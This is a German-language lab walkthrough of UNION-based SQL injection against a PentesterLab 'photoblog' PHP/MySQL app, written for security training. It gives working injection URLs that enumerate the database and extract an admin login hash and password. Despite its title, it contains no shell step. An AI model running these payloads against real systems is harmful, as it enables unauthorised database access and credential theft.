# SQL Injection to Shell – Exploitation Walkthrough



## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Erste Tests](#erste-tests)
- [Datenbankaufbau erkunden](#datenbankaufbau-erkunden)
- [Benutzeranmeldeinformationen extrahieren](#benutzeranmeldeinformationen-extrahieren)
- [Haftungsausschluss](#haftungsausschluss)





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Einleitung

Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Ziel, Informationen aus der Datenbank zu extrahieren und Zugangsdaten zu erlangen. Die genutzte Zielanwendung basiert auf einer MySQL-Datenbank.

- **MySQL-Version:** 5.1.63-0+squeeze1  
- **Datenbank:** photoblog  
- **Benutzer:** pentesterlab@localhost  
- **Datenverzeichnis:** /var/lib/mysql/  

Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Daten zu erlangen, die zur weiteren Kompromittierung des Systems verwendet werden können.





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Erste Tests

### Basistest
```http:
http://192.168.1.142/cat.php?id=2 UNION SELECT 1,2,3,4 --+
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Version Anzeigen
```http:
http://192.168.1.142/cat.php?id=2 UNION SELECT 1,version(),3,4 --+
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Aktive Datenbank anzeigen
```http
http://192.168.1.142/cat.php?id=2 UNION SELECT 1,database(),3,4 --+
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Benutzer anlegen
```http
http://192.168.1.142/cat.php?id=2 UNION SELECT 1,user(),3,4 --+
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Datenbankaufbau erkunden

### Datenbanken auflisten

```sql
UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata
```

**Ergebnis Beispiel:**
- information_schema
- photoblog

**Ziel-Datenbank: Beispiel:**
- photoblog



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Tabellen in der photoblog-Datenbank

```sql
UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()
```

**Ergebnis Beispiel:**
- categories
- pictures
- users



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### Spalten der Tabelle `users`

```sql
UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x7573657273
```

***HINWEIS:*** 
0x7573657273 ist Hexadezimal aus dem Wort users

**Ergebnis Beispiel:**
- id
- login
- password



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Benutzeranmeldeinformationen extrahieren

```http
http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x3a3a,password),3,4 FROM users
```

**Ergebnis (entschlüsselt):** **Beispiel**
```cpp
1::admin::8efe310f9ab3efeae8d410a8e0166eb2
```

**Anmeldeinformationen:** **Beispiel**
- Benutzername: admin
- Passwort-Hash (MD5): 8efe310f9ab3efeae8d410a8e0166eb2
- Klartext-Passwort: P4ssw0rd





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---